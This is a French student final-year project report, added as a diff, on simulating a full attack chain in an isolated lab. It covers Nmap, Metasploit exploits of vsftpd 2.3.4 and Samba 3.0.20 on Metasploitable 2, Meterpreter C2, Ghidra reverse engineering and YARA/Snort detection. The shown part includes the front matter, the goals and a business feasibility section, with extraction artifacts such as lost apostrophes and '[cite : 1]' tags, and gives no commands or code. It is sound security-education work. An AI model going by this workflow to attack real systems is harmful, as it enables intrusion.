@@ -1,0 +1,1920 @@
+=== PAGE 1 ===
+4ème Année Cybersécurité & Réseaux
+Réalisé par :
+M. Azzat Nouamane
+M. Hnid Aimane
+Encadrants :
+M. Mouloud Afouar
+Mme. Khadija Bousmar
+Mme. Zineb Benyahya
+Année Universitaire : 2025 / 2026
+RAPPORT DE PROJET DE FIN D'ANNÉE
+Simulation d'une Chaîne d'Attaque
+Complète
+De l'exploitation à l'ingénierie inverse de malware
+Scanner pour accéder au site web
+
+=== PAGE 2 ===
+Dédicace
+Nous dédions ce rapport à nos familles, dont le soutien indéfectible et lencouragement constant
+ont été la source de notre motivation tout au long de ce parcours académique.
+Leur conﬁance en nos capacités et leurs sacriﬁces silencieux ont constitué le socle sur lequel
+repose lensemble de notre formation.
+À nos camarades de la spécialité Cybersécurité & Réseaux, pour les échanges enrichissants, la
+solidarité et la complicité qui ont rendu cette formation encore plus stimulante et mémorable.
+À notre encadrant, M. Mouloud Afouar, pour sa disponibilité, ses conseils avisés et son
+engagement pédagogique qui nous ont guidés avec rigueur et bienveillance tout au long de ce
+projet.
+À notre encadrante, Mme Khadija Bousmar, pour son accompagnement précieux, ses remarques
+constructives et la pertinence de ses orientations qui ont grandement enrichi ce travail.
+À notre encadrante, Mme Zineb Benyahya, pour sa bienveillance, son soutien constant et le
+temps précieux qu’elle nous a accordé pour mener à bien ce projet.
+Enﬁn, à tous ceux qui, de près ou de loin, ont contribué à laboutissement de ce projet.
+Ce travail vous est dédié.
+Azzat Nouamane & Hnid Aimane
+i
+
+=== PAGE 3 ===
+Remerciements
+Nous tenons à exprimer notre profonde gratitude à toutes les personnes qui ont contribué à la
+réalisation de ce projet de ﬁn dannée, que ce soit sur le plan technique, académique ou humain.
+En premier lieu, nous remercions chaleureusement notre encadrant pédagogique, M. Mouloud
+Afouar, pour son accompagnement constant et son soutien tout au long de ce projet. Sa dispo-
+nibilité à répondre à nos questions, ses orientations techniques pertinentes et son exigence péda-
+gogique ont été des éléments déterminants dans la réussite de ce travail. Ses retours constructifs
+lors de chaque phase du projet nous ont permis dapprofondir notre compréhension des concepts
+de cybersécurité et daméliorer continuellement la qualité de notre travail.
+Nous remercions également la direction du Département Informatique de lÉcole Marocaine
+des Sciences de lIngénieur (EMSI) pour nous avoir oﬀert lopportunité de travailler sur un sujet à
+la fois ambitieux et porteur, en phase avec les réalités du terrain professionnel en sécurité informa-
+tique. Laccès aux salles informatiques équipées et aux ressources pédagogiques de létablissement
+a grandement facilité la conduite de nos expérimentations.
+Nous remercions aussi à lensemble du corps enseignant de la spécialité Cybersécurité &
+Réseaux pour la qualité de leur enseignement, la rigueur de leur approche et les connaissances
+transmises tout au long de notre formation. Les cours dispensés en sécurité oﬀensive, analyse
+forensique, administration réseau et cryptographie ont constitué des fondations indispensables
+pour mener à bien ce projet.
+Nous remercions nos familles pour leur patience inépuisable, leur soutien moral constant et
+leurs encouragements répétés qui nous ont permis de maintenir le cap durant les moments les plus
+intenses de ce projet, notamment lors des phases de conﬁguration du laboratoire et de rédaction
+du rapport ﬁnal.
+Enﬁn, nous remercions nos camarades de promotion pour les échanges techniques, le partage
+dexpériences et la solidarité dont ils ont fait preuve. Les discussions informelles sur les outils, les
+méthodologies et les problèmes rencontrés ont souvent apporté des éclairages précieux.
+Azzat Nouamane & Hnid Aimane
+ii
+
+=== PAGE 4 ===
+Résumé
+Ce rapport présente la réalisation dun projet de ﬁn dannée portant sur la simulation dune
+chaîne dattaque complète en cybersécurité, allant de la phase dexploitation initiale jusquà lin-
+génierie inverse du malware déployé. Lobjectif principal est de concevoir et de mettre en uvre
+un environnement de laboratoire virtuel isolé permettant détudier et de maîtriser les diﬀérentes
+phases dune cyberattaque réelle dans un cadre contrôlé, reproductible et éthiquement irrépro-
+chable.
+Lenvironnement de laboratoire est composé de deux machines virtuelles interconnectées via
+un réseau Host-Only complètement isolé dInternet : Kali Linux 2024 (machine attaquante) et
+Metasploitable 2 (machine victime intentionnellement vulnérable). Lintégralité des opérations
+est menée dans cet environnement sécurisé, sans aucune interaction avec des systèmes réels.
+Pour réaliser ce projet, plusieurs outils open source ont été utilisés :
+— Phase oﬀensive : Nmap pour la reconnaissance réseau et lidentiﬁcation des services vulné-
+rables, Metasploit Framework pour lexploitation des CVE, msfvenom pour la génération
+de payloads personnalisés, et Wireshark pour la capture et lanalyse du traﬁc Command
+& Control (C2).
+— Analyse du payload : Ghidra (outil de rétro-ingénierie open source développé par la NSA)
+pour le désassemblage, la décompilation et lidentiﬁcation des fonctions malveillantes clés.
+— Détection : Rédaction et validation de règles YARA et Snort basées sur les indicateurs de
+compromission (IOCs) extraits lors de lanalyse.
+Le projet sest déroulé en plusieurs phases successives suivant la méthodologie de la Cyber
+Kill Chain : cadrage et mise en place du laboratoire virtuel, reconnaissance et exploitation de
+vulnérabilités CVE connues (vsftpd 2.3.4 et Samba 3.0.20), déploiement du payload Meterpre-
+ter et capture du traﬁc C2, ingénierie inverse du payload avec Ghidra, rédaction des règles de
+détection, et enﬁn documentation complète avec IOCs et mesures de remédiation.
+Mots-clés : Cybersécurité, Reverse Engineering, Metasploit, Ghidra, YARA, Meterpreter, Cyber
+Kill Chain, IOC, Analyse Malware, CVE
+iii
+
+=== PAGE 5 ===
+Abstract
+This report presents the realization of a ﬁnal year project focused on the simulation of a
+complete cyberattack chain, from the initial exploitation phase to the reverse engineering of the
+deployed malware. The main objective is to design and implement an isolated virtual laboratory
+environment enabling the study and mastery of the diﬀerent phases of a real cyberattack in a
+controlled, reproducible, and ethically sound framework.
+The laboratory environment consists of two virtual machines interconnected through a host-
+only network completely isolated from the Internet : Kali Linux 2024 (attacking machine) and
+Metasploitable 2 (intentionally vulnerable victim machine). All operations are conducted within
+this secure environment, without any interaction with real systems.
+To carry out this project, several open-source tools were used : Nmap for network reconnais-
+sance, Metasploit Framework for CVE exploitation, msfvenom for payload generation, Wireshark
+for C2 traﬃc capture, Ghidra for disassembly and decompilation of the malicious binary, and
+YARA/Snort rules for detection based on extracted indicators of compromise.
+Keywords : Cybersecurity, Reverse Engineering, Metasploit, Ghidra, YARA, Meterpreter, Cyber
+Kill Chain, IOC, Malware Analysis, CVE
+iv
+
+=== PAGE 6 ===
+Liste des abréviations
+Abréviation Signiﬁcation
+C2 Command & Control
+CVE Common Vulnerabilities and Exposures
+DLL Dynamic-Link Library
+IOC Indicateur de Compromission
+NSA National Security Agency
+PE Portable Executable
+RE Reverse Engineering
+VM Virtual Machine
+YARA Yet Another Recursive Acronym
+PCAP Packet Capture
+IDS Intrusion Detection System
+TTPs Tactics, Techniques and Procedures
+CKC Cyber Kill Chain
+FTP File Transfer Protocol
+RMI Remote Method Invocation
+RCE Remote Code Execution
+v
+
+=== PAGE 7 ===
+Table des matières
+Dédicace i
+Remerciements ii
+Résumé iii
+Abstract iv
+Liste des abréviations v
+Introduction générale 1
+1 Contexte général du projet 2
+1.1 Introduction . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 2
+1.2 Présentation de lorganisme daccueil . . . . . . . . . . . . . . . . . . . . . . . . . . 2
+1.2.1 LÉcole Marocaine des Sciences de lIngénieur (EMSI) . . . . . . . . . . . . 2
+1.3 Problématique . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 2
+1.4 Cadre du projet . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 3
+1.5 Présentation du projet . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 3
+1.6 Objectifs du projet . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 3
+1.6.1 Objectif principal . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 3
+1.6.2 Objectifs secondaires . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 3
+1.7 Missions et tâches . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 4
+1.8 Conclusion . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 4
+2 Étude de faisabilité entrepreneuriale : Solution CyberRange Lab 5
+2.1 Introduction de la partie entrepreneuriat . . . . . . . . . . . . . . . . . . . . . . . 5
+2.2 Contexte et identiﬁcation du problème . . . . . . . . . . . . . . . . . . . . . . . . 5
+2.2.1 Présentation du contexte . . . . . . . . . . . . . . . . . . . . . . . . . . . . 5
+2.2.2 Secteur concerné et tendances du marché . . . . . . . . . . . . . . . . . . 5
+2.2.3 Identiﬁcation du problème et limites des solutions existantes . . . . . . . . 6
+2.3 Présentation de l’idée et de la solution . . . . . . . . . . . . . . . . . . . . . . . . 6
+2.3.1 Description de la solution . . . . . . . . . . . . . . . . . . . . . . . . . . . 6
+2.3.2 Fonctionnalités principales . . . . . . . . . . . . . . . . . . . . . . . . . . . 6
+2.3.3 Technologies utilisées . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 7
+2.3.4 Valeur ajoutée et avantage concurrentiel . . . . . . . . . . . . . . . . . . . 7
+2.4 Origine de l’idée et analyse stratégique du marché . . . . . . . . . . . . . . . . . . 7
+2.4.1 Source et inspirations de l’idée . . . . . . . . . . . . . . . . . . . . . . . . 7
+2.4.2 Analyse de la concurrence . . . . . . . . . . . . . . . . . . . . . . . . . . . 7
+2.4.3 Analyse des fournisseurs et cadre réglementaire . . . . . . . . . . . . . . . 7
+2.4.4 Outils d’analyse stratégique du marché . . . . . . . . . . . . . . . . . . . . 7
+vi
+
+=== PAGE 8 ===
+TABLE DES MATIÈRES EMSI
+2.5 Étude de faisabilité technique et marketing stratégique . . . . . . . . . . . . . . . 9
+2.5.1 Ressources et proﬁls requis . . . . . . . . . . . . . . . . . . . . . . . . . . 9
+2.5.2 Segmentation, Ciblage et Positionnement . . . . . . . . . . . . . . . . . . 9
+2.5.3 Stratégie Marketing Mix (4P) . . . . . . . . . . . . . . . . . . . . . . . . . 10
+2.6 Étude de faisabilité ﬁnancière et cadre juridique . . . . . . . . . . . . . . . . . . . 10
+2.6.1 Investissement initial et prévisions de ventes . . . . . . . . . . . . . . . . . 10
+2.6.2 Structure des charges et rentabilité . . . . . . . . . . . . . . . . . . . . . . 10
+2.6.3 Cadre juridique . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 11
+2.7 Stratégie de développement à long terme . . . . . . . . . . . . . . . . . . . . . . . 11
+2.8 Conclusion . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 11
+3 Conduite et gestion du projet 12
+3.1 Cahier des charges oﬃciel du projet . . . . . . . . . . . . . . . . . . . . . . . . . . 12
+3.1.1 Présentation et contexte du projet . . . . . . . . . . . . . . . . . . . . . . 12
+3.1.2 Objectifs du projet . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 12
+3.1.3 Description de l’existant . . . . . . . . . . . . . . . . . . . . . . . . . . . . 12
+3.1.4 Critères d’acceptabilité du produit . . . . . . . . . . . . . . . . . . . . . . 13
+3.2 Expression détaillée des besoins . . . . . . . . . . . . . . . . . . . . . . . . . . . . 13
+3.2.1 Besoins fonctionnels . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 13
+3.2.2 Besoins non fonctionnels . . . . . . . . . . . . . . . . . . . . . . . . . . . . 14
+3.3 Cycle de vie du projet : Approche Méthodologique Agile . . . . . . . . . . . . . . 15
+3.3.1 Justiﬁcation du choix du framework Agile Scrum . . . . . . . . . . . . . . 15
+3.3.2 Planiﬁcation et ordonnancement structurel des Sprints . . . . . . . . . . . 15
+3.4 Découpage analytique du projet (WBS) et Allocation des Ressources . . . . . . . 15
+3.4.1 Dictionnaire des Tâches (Work Breakdown Structure) . . . . . . . . . . . 15
+3.4.2 Matrice des responsabilités et gouvernance (RACI) . . . . . . . . . . . . . 16
+3.5 Planiﬁcation temporelle et Jalons de livraison . . . . . . . . . . . . . . . . . . . . 16
+3.5.1 Modélisation de la planiﬁcation et Feuille de route sous Jira . . . . . . . . 16
+3.5.2 Analyse du chemin critique et interdépendances . . . . . . . . . . . . . . . 17
+3.5.3 Tableau de suivi des jalons intermédiaires (Milestones) . . . . . . . . . . . 17
+3.5.4 Visualisation du Diagramme de Gantt du Projet . . . . . . . . . . . . . . 17
+3.6 Plan d’assurance qualité et Gestion des risques . . . . . . . . . . . . . . . . . . . 18
+3.6.1 Procédures du Plan d’Assurance Qualité (PAQ) . . . . . . . . . . . . . . . 18
+3.6.2 Matrice d’analyse des risques et plans de contingence . . . . . . . . . . . . 18
+4 Analyse et conception 20
+4.1 Introduction . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 20
+4.2 Besoins fonctionnels . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 20
+4.2.1 Simulation de la phase oﬀensive (Fondamental) . . . . . . . . . . . . . . . 20
+4.2.2 Analyse du payload Reverse Engineering (Fondamental) . . . . . . . . . . 21
+4.2.3 Détection et défense (Important) . . . . . . . . . . . . . . . . . . . . . . . 21
+4.3 Besoins non fonctionnels . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 21
+4.4 Architecture du laboratoire virtuel . . . . . . . . . . . . . . . . . . . . . . . . . . 22
+4.5 Outils et technologies . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 22
+4.6 Architecture de la chaîne dattaque simulée . . . . . . . . . . . . . . . . . . . . . . 23
+4.7 Conclusion . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 25
+5 Réalisation et résultats 26
+5.1 Introduction . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 26
+5.2 Mise en place du laboratoire virtuel . . . . . . . . . . . . . . . . . . . . . . . . . . 26
+5.3 Phase de reconnaissance Scan Nmap . . . . . . . . . . . . . . . . . . . . . . . . . 27
+5.4 Phase dexploitation Metasploit Framework . . . . . . . . . . . . . . . . . . . . . 28
+vii
+
+=== PAGE 9 ===
+TABLE DES MATIÈRES EMSI
+5.4.1 Exploit 1 vsftpd 2.3.4 (CVE-2011-2523) . . . . . . . . . . . . . . . . . . . 28
+5.4.2 Exploit 2 Samba 3.0.20 (CVE-2007-2447) . . . . . . . . . . . . . . . . . . 29
+5.5 Déploiement du payload et capture C2 . . . . . . . . . . . . . . . . . . . . . . . . 30
+5.6 Ingénierie inverse du payload Ghidra . . . . . . . . . . . . . . . . . . . . . . . . . 31
+5.6.1 Import et analyse initiale du payload dans Ghidra . . . . . . . . . . . . . 31
+5.6.2 Identiﬁcation des fonctions clés . . . . . . . . . . . . . . . . . . . . . . . . 32
+5.6.3 Extraction des indicateurs de compromission (IOCs) . . . . . . . . . . . . 33
+5.7 Détection et remédiation . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 33
+5.7.1 Règle YARA . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 33
+5.7.2 Règle Snort . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 34
+5.7.3 Tableau des IOCs . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 35
+5.8 Valorisation du projet : Vitrine web et support de démonstration vidéo . . . . . . 35
+5.9 Remédiation et durcissement . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 36
+5.10 Conclusion . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 38
+Conclusion générale et perspectives 39
+Références 40
+viii
+
+=== PAGE 10 ===
+Table des ﬁgures
+3.1 Diagramme de Gantt du projet issu de l’outil Jira. . . . . . . . . . . . . . . . . . 18
+4.1 Architecture du laboratoire virtuel (réseau Host-Only) . . . . . . . . . . . . . . . 22
+4.2 Matrice dinteropérabilité et ﬂux de données entre les outils oﬀensifs et défensifs . 23
+4.3 Diagramme des phases de la Cyber Kill Chain appliqué au projet . . . . . . . . . 24
+4.4 Cinématique de transition opérationnelle : de l’analyse d’artefacts malveillants à
+la création de signatures défensives . . . . . . . . . . . . . . . . . . . . . . . . . . 24
+5.1 Capture de la conﬁguration réseau Host-Only dans VirtualBox . . . . . . . . . . 27
+5.2 Résultats complets du scan Nmap sur Metasploitable 2 . . . . . . . . . . . . . . . 28
+5.3 Shell root obtenu via la backdoor vsftpd 2.3.4 (CVE-2011-2523) . . . . . . . . . . 29
+5.4 Shell root obtenu via linjection Samba (CVE-2007-2447) . . . . . . . . . . . . . . 30
+5.5 Session Meterpreter établie entre Kali et Metasploitable 2 . . . . . . . . . . . . . 31
+5.6 Capture du traﬁc C2 Meterpreter dans Wireshark . . . . . . . . . . . . . . . . . . 31
+5.7 Vue CodeBrowser de Ghidra après import et analyse du payload . . . . . . . . . 32
+5.8 Vue décompilateur Ghidra identiﬁcation de VirtualAlloc et CreateRemoteThread 33
+5.9 Arbre dappels (Call Graph) du payload dans Ghidra . . . . . . . . . . . . . . . . 33
+5.10 Résultat du test de la règle YARA sur le payload . . . . . . . . . . . . . . . . . . 34
+5.11 Test de la règle Snort sur le ﬁchier .pcap C2 . . . . . . . . . . . . . . . . . . . . . 35
+5.12 Interface de la plateforme web dédiée présentant les guides de remédiation et de
+durcissement du laboratoire . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 37
+ix
+
+=== PAGE 11 ===
+Liste des tableaux
+2.1 Analyse comparative de la concurrence . . . . . . . . . . . . . . . . . . . . . . . . 8
+2.2 Matrice SWOT du projet CyberRange Lab . . . . . . . . . . . . . . . . . . . . . 8
+2.3 Analyse PESTEL du projet . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 8
+2.4 Analyse des 5 forces de Porter . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 9
+2.5 Besoins matériels et infrastructure . . . . . . . . . . . . . . . . . . . . . . . . . . 9
+2.6 Proﬁls de l’équipe requis au lancement . . . . . . . . . . . . . . . . . . . . . . . . 9
+2.7 Détail de l’investissement initial . . . . . . . . . . . . . . . . . . . . . . . . . . . . 10
+2.8 Prévisions de ventes mensuelles (régime de croisière) . . . . . . . . . . . . . . . . 10
+3.1 Structure de découpage du projet (WBS) et évaluation des charges. . . . . . . . . 16
+3.2 Matrice RACI d’aﬀectation des rôles du projet. . . . . . . . . . . . . . . . . . . . 17
+3.3 Tableau des échéances intermédiaires et jalons du projet. . . . . . . . . . . . . . . 18
+3.4 Matrice d’évaluation des risques et stratégies d’atténuation. . . . . . . . . . . . . 19
+4.1 Architecture du laboratoire virtuel . . . . . . . . . . . . . . . . . . . . . . . . . . 22
+4.2 Outils et technologies utilisés . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 23
+5.1 Résultats du scan Nmap ports, services et criticité . . . . . . . . . . . . . . . . . 28
+5.2 Fonctions clés identiﬁées dans Ghidra . . . . . . . . . . . . . . . . . . . . . . . . . 32
+5.3 Tableau des Indicateurs de Compromission (IOCs) . . . . . . . . . . . . . . . . . 35
+x
+
+=== PAGE 12 ===
+Introduction générale
+Dans un contexte mondial où les cybermenaces évoluent à une vitesse sans précédent, la
+compréhension approfondie des mécanismes dattaque est devenue une compétence fondamentale
+pour tout professionnel de la sécurité informatique. Les organisations font face à des adversaires
+de plus en plus sophistiqués, capables de déployer des chaînes dattaque complexes combinant
+exploitation de vulnérabilités, déploiement de malwares personnalisés et établissement de canaux
+de commande et contrôle (C2) discrets. Selon le rapport IBM Cost of a Data Breach 2024, le
+coût moyen dune violation de données atteint 4,88 millions de dollars, soulignant lurgence de
+former des professionnels capables de comprendre ces menaces en profondeur.
+Face à ce constat, la formation en cybersécurité ne peut se limiter à des approches purement
+théoriques. Il est indispensable de disposer denvironnements pratiques permettant de simuler,
+analyser et comprendre ces attaques dans des conditions réalistes mais sécurisées. Lécart entre
+la théorie et la pratique est lun des déﬁs les plus importants de la formation en cybersécurité :
+connaître le fonctionnement théorique dune vulnérabilité est très diﬀérent de lexploiter concrè-
+tement, danalyser le malware quelle permet de déployer, et de construire les règles de détection
+correspondantes.
+Cest précisément dans cette perspective que sinstruit ce Projet de Fin dAnnée (PF A), réa-
+lisé dans le cadre de la spécialité Cybersécurité & Réseaux de lÉcole Marocaine des Sciences
+de lIngénieur (EMSI). Ce projet propose la conception et la mise en uvre dune solution tech-
+nique robuste, mais également son repositionnement sous un prisme entrepreneurial innovant et
+structuré.
+Ce rapport est structuré en cinq chapitres principaux. Le Chapitre 1 présente le contexte aca-
+démique, la problématique et les objectifs généraux du projet. Le Chapitre 2 développe l’étude de
+faisabilité entrepreneuriale et le modèle d’aﬀaires de la solution proposée, baptisée ń CyberRange
+Lab ż. Le Chapitre 3 décrit la méthodologie de gestion, la conduite du projet et la planiﬁcation
+du travail en binôme. Le Chapitre 4 expose larchitecture du laboratoire, les besoins fonction-
+nels et la conception technique globale. Enﬁn, le Chapitre 5 détaille le déroulement de chaque
+phase opérationnelle technique, les résultats oﬀensifs et défensifs obtenus, ainsi que les règles de
+détection produites.
+1
+
+=== PAGE 13 ===
+Chapitre 1
+Contexte général du projet
+1.1 Introduction
+Ce premier chapitre présente le cadre général dans lequel sinscrit ce projet de ﬁn dannée. Il
+expose la problématique identiﬁée, le contexte académique et professionnel qui lentourent, ainsi
+que les objectifs concrets visés et la répartition des missions au sein du binôme. Ce cadrage est
+essentiel pour comprendre les choix techniques et méthodologiques qui seront décrits dans les
+chapitres suivants.
+1.2 Présentation de lorganisme daccueil
+1.2.1 LÉcole Marocaine des Sciences de lIngénieur (EMSI)
+LEMSI est une grande école dingénieurs marocaine fondée en 1986, réputée pour la qualité
+de sa formation en ingénierie informatique, réseaux et systèmes. A vec plusieurs campus répartis
+sur le territoire national, lEMSI forme chaque année des ingénieurs reconnus par les entreprises
+nationales et internationales pour leur maîtrise technique et leur capacité dadaptation.
+Son département informatique propose plusieurs spécialités, dont la spécialité Cybersécurité
+& Réseaux, axée sur les technologies de sécurité oﬀensive et défensive, les systèmes dexploitation,
+les architectures réseau, la cryptographie et la conformité réglementaire. Cette spécialité prépare
+les étudiants à des métiers en forte demande tels que pentester, analyste SOC, ingénieur sécurité
+et analyste malware. Dans sa démarche dexcellence académique, lEMSI encourage les projets de
+ﬁn dannée à forte valeur ajoutée pédagogique et professionnelle, comme en témoigne ce PF A.
+1.3 Problématique
+Malgré une formation théorique solide, les étudiants en cybersécurité manquent souvent de
+mise en pratique intégrée couvrant lensemble de la chaîne oﬀensive et défensive. Les cours
+abordent séparément la reconnaissance, lexploitation, lanalyse forensique et la détection, sans
+oﬀrir un environnement uniﬁé permettant dexpérimenter la continuité dune attaque réelle de
+bout en bout. Cette approche fragmentaire crée un manque de vision systémique chez les futurs
+professionnels, qui peuvent maîtriser chaque étape individuellement sans comprendre comment
+elles sarticulent dans un scénario dattaque réel.
+Comment simuler, dans un environnement contrôlé et reproductible, une chaîne dattaque
+complète allant de lexploitation dun système vulnérable jusquà lingénierie inverse du malware
+déployé, aﬁn de former des professionnels capables de détecter, analyser et contrer ce type de
+menaces ?
+2
+
+=== PAGE 14 ===
+CHAPITRE 1. CONTEXTE GÉNÉRAL DU PROJET EMSI
+1.4 Cadre du projet
+Ce projet est réalisé dans le cadre de la formation en Cybersécurité & Réseaux à lEMSI pour
+lannée académique 2025/2026. Il sagit dun projet binôme, encadré par M. Mouloud Afouar,
+enseignant spécialisé en sécurité informatique. Le projet a été conduit exclusivement sur des
+machines virtuelles conçues à cet eﬀet (Kali Linux et Metasploitable 2), dans le strict respect
+des règles éthiques et légales : aucun test sur un système réel ou tiers na été réalisé, et aucun
+outil malveillant na quitté lenvironnement virtualisé isolé.
+Lensemble du projet a été réalisé avec un budget nul, en utilisant exclusivement des outils
+open source ou gratuits, ce qui démontre la faisabilité de ce type denvironnement de formation
+dans tout établissement disposant de machines standard.
+1.5 Présentation du projet
+Le projet consiste à mettre en place une solution de simulation dune chaîne dattaque com-
+plète dans un laboratoire virtuel isolé composé de deux machines : Kali Linux (attaquant) et
+Metasploitable 2 (victime). Il couvre les phases suivantes, de manière séquentielle et documentée :
+— Reconnaissance réseau avec Nmap pour identiﬁer les services actifs, les versions logicielles
+et les vulnérabilités potentielles sur la machine victime Metasploitable 2.
+— Exploitation de vulnérabilités CVE connues via Metasploit Framework : vsftpd 2.3.4
+(CVE-2011-2523) et Samba 3.0.20 (CVE-2007-2447).
+— Génération dun payload Meterpreter personnalisé avec msfvenom et établissement dun
+canal Command & Control (C2) entre les deux machines.
+— Capture et analyse du traﬁc C2 avec Wireshark pour documenter les patterns de commu-
+nication du payload.
+— Ingénierie inverse (Reverse Engineering) du payload avec Ghidra : désassemblage, décom-
+pilation et identiﬁcation des fonctions malveillantes clés (VirtualAlloc, CreateRemote-
+Thread, connect()).
+— Production de règles de détection YARA et Snort basées sur les résultats de lanalyse du
+payload.
+— Documentation complète avec IOCs, captures décran annotées, mesures de remédiation
+et guide de reproduction.
+1.6 Objectifs du projet
+1.6.1 Objectif principal
+Concevoir et mettre en uvre une solution de simulation dune chaîne dattaque complète, de
+la phase dexploitation dun système vulnérable jusquà lingénierie inverse du malware déployé,
+dans un environnement virtuel isolé composé de Kali Linux et Metasploitable 2, en utilisant
+exclusivement des outils open source.
+1.6.2 Objectifs secondaires
+— Mettre en place un environnement de laboratoire virtuel isolé et sécurisé avec Kali Linux
+2024 et Metasploitable 2, interconnectés via un réseau Host-Only sans accès Internet.
+— Simuler les phases dune attaque réelle : reconnaissance Nmap, exploitation de CVE avec
+Metasploit, déploiement de payload Meterpreter et établissement dun canal C2 capturé
+avec Wireshark.
+— Réaliser une ingénierie inverse complète du payload avec Ghidra : identiﬁcation des fonc-
+tions dinjection mémoire, des appels système réseau et des mécanismes dobfuscation.
+3
+
+=== PAGE 15 ===
+CHAPITRE 1. CONTEXTE GÉNÉRAL DU PROJET EMSI
+— Produire des règles de détection fonctionnelles (YARA, Snort) basées sur les résultats de
+lanalyse du payload.
+— Documenter les mesures de remédiation et de durcissement applicables aux vulnérabilités
+exploitées.
+— Livrer un rapport technique complet, une démonstration live et un tableau dIndicateurs
+de Compromission (IOCs).
+1.7 Missions et tâches
+Les deux membres du binôme ont partagé les responsabilités de manière complémentaire,
+en veillant à ce que chaque membre soit impliqué dans toutes les phases pour garantir une
+compréhension globale du projet :
+— Azzat Nouamane : Phase oﬀensive (exploitation CVE, génération payload, session C2 via
+Metasploit et msfvenom), capture et analyse du traﬁc Wireshark, rédaction des chapitres
+1, 5 et de la conclusion.
+— Hnid Aimane : Conﬁguration du laboratoire virtuel (VirtualBox, réseau Host-Only), in-
+génierie inverse avec Ghidra (désassemblage, identiﬁcation des fonctions clés), rédaction
+des règles YARA et Snort, préparation de la démonstration et rédaction des chapitres 3,
+4.
+Les deux membres ont participé conjointement à la validation croisée de chaque phase, à la
+revue du rapport et à la gestion de version via Git. Des réunions hebdomadaires ont permis de
+synchroniser les avancements et de résoudre les problèmes rencontrés.
+1.8 Conclusion
+Ce premier chapitre a permis de cadrer le projet en exposant le contexte académique, la
+problématique identiﬁée, les objectifs visés et la répartition des missions au sein du binôme. Il
+établit les fondations nécessaires pour aborder les aspects méthodologiques, entrepreneuriaux et
+techniques dans les chapitres suivants.
+4
+
+=== PAGE 16 ===
+Chapitre 2
+Étude de faisabilité entrepreneuriale :
+Solution CyberRange Lab
+2.1 Introduction de la partie entrepreneuriat
+Cette partie du rapport de PF A a pour objectif de démontrer que le projet technique réalisé
+un laboratoire de simulation d’une chaîne d’attaque complète, intégrant exploitation oﬀensive,
+ingénierie inverse de malware et détection répond à un besoin réel, possède un potentiel de
+marché, peut générer de la valeur, est économiquement viable et peut être transformé en un
+véritable projet d’entreprise[cite : 1].
+À cette ﬁn, le projet technique est repositionné sous la forme d’une oﬀre entrepreneuriale
+baptisée ń CyberRange Lab ż : une plateforme de formation pratique en cybersécurité, accessible
+en ligne, qui reproduit pour des apprenants marocains et africains francophones l’expérience
+vécue par les étudiants durant ce PF A[cite : 1]. Les sections suivantes développent le contexte, la
+solution proposée, l’étude de marché, la stratégie marketing, la faisabilité technique et ﬁnancière,
+l’aspect juridique ainsi que la stratégie de développement de ce projet[cite : 1].
+2.2 Contexte et identiﬁcation du problème
+2.2.1 Présentation du contexte
+Le Maroc connaît une transformation numérique accélérée, portée par la digitalisation des
+services bancaires, des administrations publiques, ainsi que par la croissance soutenue du secteur
+de l’oﬀshoring et des entreprises de services numériques (ESN/BPO)[cite : 1]. Cette dépendance
+croissante aux systèmes d’information s’accompagne d’une exposition accrue aux cybermenaces :
+phishing, rançongiciels, intrusions via des services mal conﬁgurés ou non mis à jour, etc[cite : 1].
+Le Royaume s’est doté d’une stratégie nationale de cybersécurité et d’une Direction Générale de
+la Sécurité des Systèmes d’Information (DGSSI), traduisant une volonté institutionnelle forte de
+renforcer les compétences locales en cybersécurité[cite : 1].
+2.2.2 Secteur concerné et tendances du marché
+Le secteur visé est celui de la formation pratique en cybersécurité (EdTech sécurité), à la
+croisée de l’enseignement supérieur, de la formation continue en entreprise et des plateformes
+de ń cyber-range ż en ligne[cite : 1]. Ce secteur regroupe les outils et services permettant à
+des apprenants de s’exercer dans des environnements techniques réalistes mais isolés et sans
+danger[cite : 1].
+La demande de proﬁls tels que SOC Analyst, Pentester, Threat Hunter ou Analyste DFIR
+dépasse largement l’oﬀre de diplômés correctement préparés à la pratique opérationnelle[cite :
+5
+
+=== PAGE 17 ===
+CHAPITRE 2. ÉTUDE DE F AISABILITÉ ENTREPRENEURIALE : SOLUTION
+CYBERRANGE LAB EMSI
+1]. Les recruteurs valorisent de plus en plus les compétences démontrées par la pratique exer-
+cices de type Capture The Flag (CTF), laboratoires, certiﬁcations ń hands-on ż au détriment
+des seuls diplômes théoriques[cite : 1]. On observe par ailleurs, à l’échelle mondiale, un essor
+continu des plateformes de type ń learn by doing ż et des cyber-ranges, ainsi qu’une multiplica-
+tion des compétitions CTF universitaires et professionnelles, y compris au Maroc et en Afrique
+francophone[cite : 1].
